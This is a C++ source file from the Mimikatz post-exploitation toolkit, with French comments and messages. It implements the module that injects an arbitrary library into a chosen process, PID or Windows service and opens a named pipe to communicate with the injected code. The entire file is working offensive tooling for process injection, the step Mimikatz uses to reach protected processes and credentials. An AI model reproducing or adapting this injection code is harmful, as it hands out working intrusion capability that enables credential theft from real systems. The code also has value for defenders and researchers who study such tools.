/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by-nc-sa/3.0/fr/
*/
#include "mod_mimikatz_inject.h"

mod_pipe * mod_mimikatz_inject::monCommunicator = NULL;

vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> mod_mimikatz_inject::getMimiKatzCommands()
{
	vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> monVector;
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(pid, L"pid", L"Injecte une librairire communicante dans un PID"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(process, L"process", L"Injecte une librairire communicante dans un processus"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(service, L"service", L"Injecte une librairire communicante dans un service"));
	return monVector;
}

bool mod_mimikatz_inject::process(vector<wstring> * arguments)
{
	wstring processName = arguments->front();
	wstring fullLib = arguments->back();
	
	mod_process::KIWI_PROCESSENTRY32 monProcess;
	if(mod_process::getUniqueForName(&monProcess, &processName))
	{
		wcout << L"PROCESSENTRY32(" << processName << L").th32ProcessID = " << monProcess.th32ProcessID << endl;
		injectInPid(monProcess.th32ProcessID, fullLib);
	}
	else wcout << L"Trop, ou pas de processus : \'" << processName << L"\' mod_process::getUniqueProcessForName : " << mod_system::getWinError() << endl;

	return true;
}

bool mod_mimikatz_inject::service(vector<wstring> * arguments)
{
	wstring serviceName = arguments->front();
	wstring fullLib = arguments->back();
	
	mod_service::KIWI_SERVICE_STATUS_PROCESS monService;
	if(mod_service::getUniqueForName(&monService, &serviceName))
	{
		wcout << L"SERVICE(" << serviceName << L").serviceDisplayName = " << monService.serviceDisplayName << endl;
		wcout << L"SERVICE(" << serviceName << L").ServiceStatusProcess.dwProcessId = " << monService.ServiceStatusProcess.dwProcessId << endl;
		injectInPid(monService.ServiceStatusProcess.dwProcessId, fullLib);
	}
	else wcout << L"Service unique introuvable : \'" << serviceName << L"\' ; mod_service::getUniqueForName : " << mod_system::getWinError() << endl;

	return true;
}

bool mod_mimikatz_inject::pid(vector<wstring> * arguments)
{
	wstring strPid = arguments->front();
	wstring fullLib = arguments->back();
	
	DWORD pid;
	wstringstream monStream(strPid);
	monStream >> pid;

	injectInPid(pid, fullLib, !(arguments->size() >= 3));

	return true;
}

bool mod_mimikatz_inject::injectInPid(DWORD & pid, wstring & libPath, bool isComm)
{
	bool reussite = false;

	if(!isComm || (isComm && !monCommunicator))
	{
		if(reussite = mod_inject::injectLibraryInPid(pid, &libPath))
		{
			if(isComm)
			{
				wstring monBuffer = L"";

				monCommunicator = new mod_pipe(L"kiwi\\mimikatz");
				wcout << L"Attente de connexion du client..." << endl;

				if(monCommunicator->createServer())
				{
					wcout << L"Serveur connecté à un client !" << endl;
					if(monCommunicator->readFromPipe(monBuffer))
					{
						wcout << L"Message du processus :" << endl << monBuffer << endl;
					}
					else
					{
						wcout << L"Erreur : Impossible de lire le premier message ! ; " <<  mod_system::getWinError() << endl;
						closeThisCommunicator();
					}
				}
				else
				{
					wcout << L"Erreur : Impossible de créer un canal de communication ! ; " << mod_system::getWinError() << endl;
					closeThisCommunicator();
				}
			}
			else
				wcout << L"Injecté sans communication (legacy)" << endl;
		} else wcout << L"Erreur : Impossible d\'injecter ! ; " << mod_system::getWinError() << endl;
	}
	else wcout << L"Erreur : un canal de communicaton est déjà ouvert" << endl;

	return reussite;
}


bool mod_mimikatz_inject::closeThisCommunicator()
{
	if(monCommunicator)
	{
		wcout << L"Fermeture du canal de communication" << endl;
		delete monCommunicator;
		monCommunicator = NULL;
	}
	return true;
}